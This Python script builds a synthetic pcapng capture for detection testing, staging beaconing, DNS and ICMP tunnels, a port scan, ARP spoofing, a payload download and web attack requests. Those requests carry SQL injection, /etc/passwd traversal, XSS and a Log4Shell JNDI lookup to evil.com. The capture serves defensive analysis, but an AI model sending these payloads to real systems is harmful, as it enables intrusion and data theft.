import struct, socket, random, os
random.seed(7)
pkts=[]  # (ts, bytes)
def eth(dst,src,et,payload): return bytes.fromhex(dst)+bytes.fromhex(src)+struct.pack('!H',et)+payload
def ip4(src,dst,proto,payload,ttl=64):
    h=struct.pack('!BBHHHBBH',0x45,0,20+len(payload),random.randint(1,65535),0x4000,ttl,proto,0)+socket.inet_aton(src)+socket.inet_aton(dst)
    return h+payload
def tcp(sp,dp,flags,payload=b''):
    return struct.pack('!HHIIBBHHH',sp,dp,random.randint(1,2**31),0,5<<4,flags,8192,0,0)+payload
def udp(sp,dp,payload): return struct.pack('!HHHH',sp,dp,8+len(payload),0)+payload
def dnsq(name,qtype=1):
    q=b''.join(bytes([len(l)])+l.encode() for l in name.split('.'))+b'\x00'
    return struct.pack('!HHHHHH',random.randint(1,65535),0x0100,1,0,0,0)+q+struct.pack('!HH',qtype,1)
MAC_A='001122334455'; MAC_B='66778899aabb'; MAC_C='aabbccddeeff'

# 1) Beacon: 192.168.1.50 -> 45.77.13.9:443 every 60s, tiny jitter
t=1700000000
for i in range(45):
    ts=t+i*60+random.uniform(-1.2,1.2)
    p=eth(MAC_A,MAC_B,0x0800, ip4('192.168.1.50','45.77.13.9',6, tcp(50000+i,443,0x02)))
    pkts.append((ts,p))
    pkts.append((ts+0.05, eth(MAC_B,MAC_A,0x0800, ip4('45.77.13.9','192.168.1.50',6, tcp(443,50000+i,0x12)))))
    pkts.append((ts+0.1, eth(MAC_A,MAC_B,0x0800, ip4('192.168.1.50','45.77.13.9',6, tcp(50000+i,443,0x18,b'x'*180)))))

# 2) DNS tunnel
for i in range(120):
    sub=''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(46))
    q=dnsq(f'{sub}.tunnel-exfil.net',16)
    pkts.append((t+i*2, eth(MAC_A,MAC_B,0x0800, ip4('192.168.1.50','192.168.1.1',17, udp(40000+i,53,q)))))

# 3) Port scan 192.168.1.77 -> 192.168.1.20 ports 1..150
for i,port in enumerate(range(1,151)):
    pkts.append((t+300+i*0.01, eth(MAC_C,MAC_B,0x0800, ip4('192.168.1.77','192.168.1.20',6, tcp(41000,port,0x02)))))

# 4) Web attacks
attacks=[b"GET /index.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1\r\nHost: shop.local\r\nUser-Agent: sqlmap/1.7\r\n\r\n",
 b"GET /?file=../../../../etc/passwd HTTP/1.1\r\nHost: shop.local\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
 b"GET /search?q=<script>alert(1)</script> HTTP/1.1\r\nHost: shop.local\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
 b"POST /api HTTP/1.1\r\nHost: shop.local\r\nUser-Agent: ${jndi:ldap://evil.com/a}\r\n\r\n",
 b"POST /login HTTP/1.1\r\nHost: shop.local\r\nAuthorization: Basic YWRtaW46UGFzc3cwcmQ=\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin&password=Passw0rd123\r\n"]
for i,a in enumerate(attacks):
    pkts.append((t+400+i, eth(MAC_C,MAC_B,0x0800, ip4('203.0.113.9','192.168.1.20',6, tcp(45000+i,80,0x18,a)))))

# 5) Telnet cleartext
for i in range(6):
    pkts.append((t+500+i, eth(MAC_A,MAC_B,0x0800, ip4('192.168.1.50','192.168.1.30',6, tcp(46000,23,0x18,b'login: root\r\n')))))

# 6) IPv6 traffic + TLS ClientHello with SNI
def ip6(src,dst,nh,payload): return struct.pack('!IHBB',6<<28,len(payload),nh,64)+socket.inet_pton(socket.AF_INET6,src)+socket.inet_pton(socket.AF_INET6,dst)+payload
def client_hello(sni):
    sni_b=sni.encode()
    ext_sni=struct.pack('!HH',0,len(sni_b)+5)+struct.pack('!HBH',len(sni_b)+3,0,len(sni_b))+sni_b
    ext_grp=struct.pack('!HH',10,4)+struct.pack('!HH',2,0x001d)
    exts=ext_sni+ext_grp
    body=struct.pack('!H',0x0303)+b'\x00'*32+b'\x00'+struct.pack('!H',4)+struct.pack('!HH',0x1301,0x1302)+b'\x01\x00'+struct.pack('!H',len(exts))+exts
    hs=b'\x01'+struct.pack('!I',len(body))[1:]+body
    return b'\x16\x03\x01'+struct.pack('!H',len(hs))+hs
for i in range(8):
    ch=client_hello(f'cdn{i}.example.com')
    pkts.append((t+600+i, eth(MAC_A,MAC_B,0x86dd, ip6('2001:db8::50','2606:4700::1111',6, tcp(47000+i,443,0x18,ch)))))

# 7) ICMP tunnel (high entropy payload)
for i in range(25):
    payload=bytes(random.getrandbits(8) for _ in range(220))
    icmp=struct.pack('!BBHHH',8,0,0,1,i)+payload
    pkts.append((t+700+i, eth(MAC_A,MAC_B,0x0800, ip4('192.168.1.50','8.8.4.4',1, icmp))))

# 8) ARP spoof: 192.168.1.1 claimed by two MACs
for mac in (MAC_B, MAC_C):
    arp=struct.pack('!HHBBH',1,0x0800,6,4,2)+bytes.fromhex(mac)+socket.inet_aton('192.168.1.1')+b'\x00'*6+socket.inet_aton('192.168.1.50')
    pkts.append((t+800, eth('ffffffffffff',mac,0x0806,arp)))

# 9) Exec download
pkts.append((t+900, eth(MAC_A,MAC_B,0x0800, ip4('192.168.1.50','185.220.101.7',6, tcp(48000,80,0x18,b"GET /gate/payload.exe HTTP/1.1\r\nHost: 185.220.101.7\r\nUser-Agent: python-requests/2.28\r\n\r\n")))))

pkts.sort(key=lambda x:x[0])
with open('/tmp/scenario.pcapng','wb') as f:
    # SHB
    opts=b''
    shb=struct.pack('<IIIHHq',0x0A0D0D0A,28,0x1A2B3C4D,1,0,-1)+struct.pack('<I',28)
    f.write(shb)
    idb=struct.pack('<III',0x00000001,20,1)+struct.pack('<I',65535)+struct.pack('<I',20)
    f.write(idb)
    for ts,data in pkts:
        pad=(-len(data))%4
        us=int(ts*1_000_000)
        blen=32+len(data)+pad
        f.write(struct.pack('<IIIIIII',0x00000006,blen,0,us>>32,us&0xffffffff,len(data),len(data)))
        f.write(data+b'\x00'*pad)
        f.write(struct.pack('<I',blen))
print('packets:',len(pkts), 'size:', os.path.getsize('/tmp/scenario.pcapng'))
